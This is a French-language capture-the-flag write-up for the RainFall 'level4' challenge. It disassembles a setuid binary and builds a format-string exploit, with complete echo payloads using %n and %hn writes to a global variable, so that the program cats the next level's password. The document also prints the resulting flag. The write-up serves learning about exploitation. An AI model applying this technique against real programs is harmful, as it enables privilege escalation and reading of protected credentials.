# 04 - Format string 2

- On se connecte en tant que level4:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

```
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
level4@RainFall:~$ gdb level4
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
```

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
```

```
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

- Voyons les parties les plus importantes du programme:
```
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
```
>Prompt stdin pour 512 octets dans une zone mémoire de 520 octets.

```
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
```
>Appelle la fonction `<p>` avec notre buffer en paramètre.

```
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
```
>La fonction `<p>` appelle `<printf@plt>` avec notre buffer en premier argument.

```
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
```
>`0x8049810 <m>:  0x00000000`

```
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
```
>`0x8048590: "/bin/cat /home/user/level5/.pass"`

- Après l'appel à `<p>`, le programme compare la valeur située en `0x8049810` avec la constante hexadécimale 102 5544 (16 930 116 en décimal). Si les deux valeurs diffèrent, il retourne, sinon, il affiche le flag.

- Donc il faut utiliser `<printf@plt>` pour assigner la valeur 16930116 en `0x8049810`, on pourrait le faire comme ceci:
>`echo -ne '\x10\x98\x04\x08 %16930110x %12$n \n' | ./level4`


- Ça marcherais, mais cette fois, divisions cette assignation de 4 octets (`%n`) en deux assignations de 2 octets chacune (`%hn`). On doit écrire 16 930 116, qui est 102 5544 en hexadécimal:
>Low order bytes = 5544 (21 828 in decimal)

>High order bytes = 0102 (258 in decimal)


- On fera donc une assignation en `0x8049810` et une autre en `0x8049812`. `0x8049810` contiendra les octets représentant la valeur la plus significative (ici, les octets de faible poids), et `0x8049812` contiendra les octets représentant la valeur la moins significative (ici, les octets de poids fort).

- Le payload donné à `<printf@plt>` sera donc:
>`\x12\x98\x04\x08\x10\x98\x04\x08 %VALUE1x %12$hn %VALUE2x %13$hn`

>`VALUE1 (0x8049812)` ==> 258 - 8 bytes for the addresses - 2 bytes for the spaces = **248**

>`VALUE2 (0x8049810)` ==> 21 828 - 258 - 2 bytes for the spaces = **21 568**


```
echo -ne '\x12\x98\x04\x08\x10\x98\x04\x08 %248x %12$hn %21568x %13$hn' | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```